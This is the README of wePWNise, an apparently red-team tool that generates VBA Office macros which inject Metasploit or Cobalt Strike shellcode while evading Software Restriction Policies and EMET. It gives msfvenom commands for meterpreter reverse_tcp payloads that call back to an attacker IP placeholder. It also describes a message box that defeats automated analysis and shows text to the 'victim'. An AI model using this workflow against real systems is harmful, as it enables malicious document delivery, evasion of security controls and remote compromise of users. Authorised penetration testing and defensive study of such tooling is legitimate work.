# wePWNise

wePWNise is proof-of-concept Python script which generates VBA code that can be used in Office macros or templates. It was designed with automation and integration in mind, targeting locked down environment scenarios. The tool enumerates Software Restriction Policies (SRPs) and EMET mitigations and dynamically identifies safe binaries to inject payloads into. wePWNise integrates with existing exploitation frameworks (e.g. Metasploit, Cobalt Strike) and it also accepts any custom payload in raw format.

## Prerequisites

* Python termcolor package. To install run: pip install termcolor

## Command line arguments

To start using wePWNise, first take a look at the options it supports:

```
usage: wepwnise.py [-h] -i86 <x86_shellcode> -i64 <x64_shellcode> [--inject64]   
                   [--out <output_file>] [--msgbox] [--msg <window_message>]

optional arguments:   
  -h, --help            show this help message and exit   
  -i86 <x86_shellcode>  Input x86 raw shellcode   
  -i64 <x64_shellcode>  Input x64 raw shellcode   
  --inject64            Inject into 64 Bit. Set to False when delivering x86   
                        payloads only. Default is True   
  --out <output_file>   File to output the VBA macro to   
  --msgbox              Present messagebox to prevent automated analysis.   
                        Default is True.   
  --msg <window_message>   
                        Custom message to present the victim if --msgbox is   
                        set to True
```

wePWNise requires both 32 and 64 bit raw payloads in order to be able to deliver the appropriate type when it lands on an unknown target. However, if only an x86 architecture is targeted, a dummy 64 bit payload must be provided to replace the missing code. 

In order to defeat certain automated analysis configurations, a message box opens upon execution of the code. The text of the message box can be altered by defining its value in the --msg parameter. To disable this functionality set the --msgbox parameter to False.

Due to performance conditions that may be introduced as a result of long SRPs/EMET policies, wePWNise reads two configuration files (binary-paths.txt and directory-paths.txt) that contain a list of executables and directories which are less likely to be monitored to be checked first. By editing the contents of those files the user can define their own choices instead. If the files are empty, wePWNise will directly start reading the SPRs/EMET policies as these would be defined within the Registry and make its injection choice purely based on the retrieved information.


## Usage examples

The following sections describe some basic usage examples of wePWNise.

### Metasploit payloads

First the payloads for both x86 and x64 architectures in raw format and ensure that the Metasploit listeners are configured appropriately.

`$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw -o /payloads/msf86.raw`   
`$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw -a x86_64 -o /payloads/msf64.raw`

Then point wePWNise to the generated payloads and direct the output to msf_wepwn.txt

`$ wepwnise.py -i86 /payloads/msf86.raw  -i64 /payloads/msf64.raw --out /payloads/msf_wepwn.txt`

### Cobalt Strike payloads

To generate a raw payload in Cobalt Strike, navigate to the following menu and from the Output dropdown select the Raw format. Repeat the process and enable the x64 checkbox to produce a 64-bit payload.

Attacks > Packages > Payload Generator

Enter the generated payloads into wePWNise to generate the VBA code.

`$ wepwnise.py -i86 /payloads/cs86.raw  -i64 /payloads/cs64.raw  --msgbox False --out /payloads/cs_wepwn.txt`


### Custom payloads

In certain cases it may be the case that only an x86 payload be available. As wePWNise expects both a 32-bit and 64-bit payloads, in order to disable 64-bit injection create a dummy 64-bit file and set the --inject64 parameter to False.

```
$ echo "+" > /payloads/dummy64.raw
$ wepwnise.py -i86 /payloads/custom.raw  -i64 /payloads/dummy64.raw --inject64 False --out /payloads/wepwn86.txt
```

Similarly, to generate 64-bit payloads only, create a dummy x86 file and supply it in wePWNise's -i86 command line paramenter.

## License

wePWNise is released under a 3-clause BSD License and maintained by [MWR InfoSecurity](https://mwrinfosecurity.com)

## Credits
This tool was originally developed by Vincent Yiu ([@vysecurity](https://twitter.com/vysecurity)).
